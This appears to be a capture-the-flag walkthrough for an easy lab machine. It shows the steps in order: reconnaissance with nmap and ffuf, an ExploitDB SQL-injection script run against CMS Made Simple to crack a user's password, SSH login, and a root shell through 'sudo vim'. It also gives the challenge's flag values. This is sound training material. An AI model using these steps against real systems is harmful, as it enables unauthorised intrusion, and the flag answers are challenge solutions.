# SimpleCTF - Easy

<details>
<summary>nmap scan</summary>

```nmap -T4 -p- -A 10.10.233.93```

Nmap scan report for 10.10.10.236
Host is up (0.17s latency).
Not shown: 9997 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
ftp-syst:
    STAT:
    FTP server status:
      Connected to ::ffff:10.17.48.136
      Logged in as ftp
      TYPE: ASCII
      No session bandwidth limit
      Session timeout in seconds is 300
      Control connection is plain text
      Data connections will be plain text
      At session startup, client count was 3
      vsFTPd 3.0.3 - secure, fast, stable
End of status
    ftp-anon: Anonymous FTP login allowed (FTP code 230)
    Can't get directory listing: TIMEOUT
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
    http-robots.txt: 2 disallowed entries
    /openemr-5_0_1_3
    http-title: Apache2 Ubuntu Default Page: It works
    http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
    ssh-hostkey:
    2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
    256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
    256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

</details>

<br>

<details>
<summary>robots.txt</summary>

"$Id: robots.txt 3494 2003-03-19 15:37:44Z mike $"
    This file tells search engines not to index your CUPS server.
    Copyright 1993-2003 by Easy Software Products.
    These coded instructions, statements, and computer programs are the
    property of Easy Software Products and are protected by Federal
    copyright law.  Distribution and use rights are outlined in the file
    "LICENSE.txt" which should have been included with this file.  If this
    file is missing or damaged please contact Easy Software Products
    at:

        Attn: CUPS Licensing Information
        Easy Software Products
        44141 Airport View Drive, Suite 204
        Hollywood, Maryland 20636-3111 USA
        Voice: (301) 373-9600
        EMail: cups-info@cups.org
        WWW: http://www.cups.org

User-agent: *
Disallow: /
Disallow: /openemr-5_0_1_3 

End of "$Id: robots.txt 3494 2003-03-19 15:37:44Z mike $".
</details>

<br>

* ffuz scan: ```ffuf -u http://10.10.10.236/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt```

* This gives us a directory /simple, which leads us to a page for CMS Made Simple,v2.2.8

* It is vulnerable to SQLi, so we can give it a try; we can download the exploit script from ExploitDB

* ```python3 46635.py -u http://10.10.10.236/simple --crack -w /usr/share/seclists/Passwords/Common-Credentials/best110.txt```:

```markdown
Salt for password found: 1dac0d92e9fa6bb2
Username found: mitch
Email found: admin@admin.com
Password found: 0c01f4468bd75d7a84c7eb73846e8d96
Password cracked: secret
```

* Now we can log into SSH: ```ssh mitch@10.10.10.236 -p 2222```

* We obtain the first flag

* user.txt: ```G00d j0b, keep up!```

* Now we can check if there are any ways to leverage elevated privileges: ```sudo -l```

* This shows us that we can use vim to get root shell: ```sudo vim -c ':!/bin/sh'```

* We obtain the root.flag

* root.txt: ```W3ll d0n3. You made it!```
